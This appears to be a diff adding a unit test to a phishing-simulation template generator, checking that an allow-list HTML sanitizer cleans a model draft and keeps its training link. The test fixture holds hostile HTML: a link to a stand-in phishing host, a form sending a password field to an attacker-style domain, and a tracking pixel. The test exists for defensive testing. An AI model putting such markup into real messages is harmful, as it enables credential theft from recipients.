@@ -1162,3 +1162,39 @@ def test_with_campaign_record_enriches_the_generation_request() -> None:
     enriched = jobs._with_campaign_record(request, record)
     assert enriched.campaign_record is not None
     assert enriched.campaign_record.claimed_brand == "DocuSign"
+
+
+# --- P2: allow-list HTML sanitizer salvages otherwise-rejected drafts --------
+
+
+def test_generation_sanitizes_and_salvages_stray_html(monkeypatch: pytest.MonkeyPatch) -> None:
+    from kp_database.models import TemplateVersion
+
+    session = _GenerationSession(_Pattern())
+    # A model draft that WOULD be rejected outright (off-allowlist link, a form,
+    # a tracking pixel). P2 cleans it and keeps the legitimate training link.
+    response = GenerationResponse(
+        subject="Security awareness exercise",
+        plain_text=f"Review this simulation: {TRAINING_URL_PLACEHOLDER}",
+        safe_html=(
+            f'<p>Please <a href="https://phish.evil/login">verify</a> via '
+            f'<a href="{TRAINING_URL_PLACEHOLDER}">training</a>.</p>'
+            '<form action="https://evil.example/c"><input name="pw"></form>'
+            '<img src="https://track.evil/p.gif" width="1" height="1">'
+        ),
+        model_id="normal-model",
+    )
+    _process_generation(monkeypatch, session, response=response)
+
+    assert session.committed is True  # salvaged, not rejected
+    template = session.added[0]
+    assert isinstance(template, TemplateVersion)
+    # Stored HTML is the cleaned version.
+    assert "phish.evil" not in template.safe_html
+    assert "<form" not in template.safe_html and "<img" not in template.safe_html
+    assert TRAINING_URL_PLACEHOLDER in template.safe_html  # the one legitimate link kept
+    assert "verify" in template.safe_html  # neutralized link keeps its anchor text
+    # Provenance recorded; the model's raw output is preserved in raw_proposal.
+    assert template.raw_proposal["sanitizer"]["changed"] is True
+    assert template.raw_proposal["sanitizer"]["neutralized_links"] >= 1
+    assert "phish.evil" in template.raw_proposal["safe_html"]
